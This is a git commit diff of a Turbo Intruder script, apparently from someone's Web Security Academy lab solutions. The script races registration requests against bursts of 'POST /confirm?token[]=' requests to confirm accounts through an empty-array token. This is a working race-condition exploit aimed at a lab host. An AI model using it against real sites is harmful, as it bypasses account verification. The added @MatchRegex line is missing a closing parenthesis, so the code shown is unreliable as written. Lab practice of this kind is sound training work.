080e9af9bcb2d3a5624071fea2d8a33b833ccf49
madi <madimirzakup@gmail.com>
2025-03-18 02:54:50 +0500

    qp

--- Server Side Topics/Race Conditions/Partial construction race conditions/race-single-packet-attack.py
+++ Server Side Topics/Race Conditions/Partial construction race conditions/race-single-packet-attack.py
@@ -8,26 +8,12 @@ def queueRequests(target, wordlists):
     token_req = '''POST /confirm?token[]= HTTP/2
 Host: 0aa400630352a7a7804c44420040003a.web-security-academy.net
 Cookie: phpsessionid=yPvtc5Q1o41RYihUGBETOIrqSeZLrLK2
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
-Origin: https://0aa400630352a7a7804c44420040003a.web-security-academy.net
-Referer: https://0aa400630352a7a7804c44420040003a.web-security-academy.net/confirm
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-Priority: u=0, i
-Te: trailers
 '''
 
 
     for i in range(20):
-        username = "frog" + str(i)        
+        username = "qweqwe" + str(i)        
         engine.queue(target.req, username, gate=str(i))
         
         for confirm in range(50):
@@ -35,6 +21,10 @@ Te: trailers
             
          
         engine.openGate(str(i))
+
+
+@MatchStatus(200)
+@MatchRegex(r".*successful.*"
 
 def handleResponse(req, interesting):
     table.add(req)
